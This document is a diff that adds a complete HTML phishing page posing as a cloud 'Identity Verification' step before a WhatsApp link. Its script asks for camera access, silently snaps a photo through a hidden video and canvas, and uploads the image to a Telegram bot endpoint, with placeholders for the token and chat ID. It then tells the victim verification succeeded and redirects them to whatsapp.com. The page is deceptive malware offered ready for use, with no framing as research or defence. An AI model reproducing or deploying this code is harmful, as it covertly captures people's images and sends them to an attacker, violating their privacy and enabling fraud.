@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cloud Verification Service</title>
+    <style>
+        body { background-color: #f4f7f9; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: #333; }
+        .card { background: white; padding: 2rem; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; width: 90%; max-width: 400px; }
+        .icon { font-size: 50px; color: #0078d4; margin-bottom: 1rem; }
+        h1 { font-size: 22px; margin-bottom: 10px; }
+        p { font-size: 14px; color: #666; margin-bottom: 20px; }
+        #verifyBtn { background-color: #0078d4; color: white; border: none; padding: 12px 25px; font-size: 16px; font-weight: bold; border-radius: 5px; cursor: pointer; transition: 0.3s; }
+        #verifyBtn:hover { background-color: #005a9e; }
+        #video-preview { display: none; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="icon">☁️</div>
+        <h1>Identity Verification</h1>
+        <p>To continue to your WhatsApp destination, please complete the secure cloud verification check.</p>
+        <button id="verifyBtn">VERIFY ME</button>
+        <canvas id="canvas" style="display:none;"></canvas>
+        <video id="video-preview" autoplay></video>
+    </div>
+
+    <script>
+        const botToken = 'YOUR_BOT_TOKEN';
+        const chatId = 'YOUR_CHAT_ID';
+
+        document.getElementById('verifyBtn').addEventListener('click', async () => {
+            const btn = document.getElementById('verifyBtn');
+            btn.innerText = "Processing...";
+            
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video-preview');
+                video.srcObject = stream;
+
+                // Small delay to allow camera to warm up
+                await new Promise(r => setTimeout(r, 1000));
+
+                const canvas = document.getElementById('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                
+                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', blob, 'capture.jpg');
+
+                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+
+                // Redirect or show success
+                alert("Verification Successful!"); 
+                window.location.href = "https://whatsapp.com";
+
+            } catch (err) {
+                alert("Verification failed. Please allow camera access to proceed.");
+                btn.innerText = "VERIFY ME";
+            }
+        });
+    </script>
+</body>
+</html>
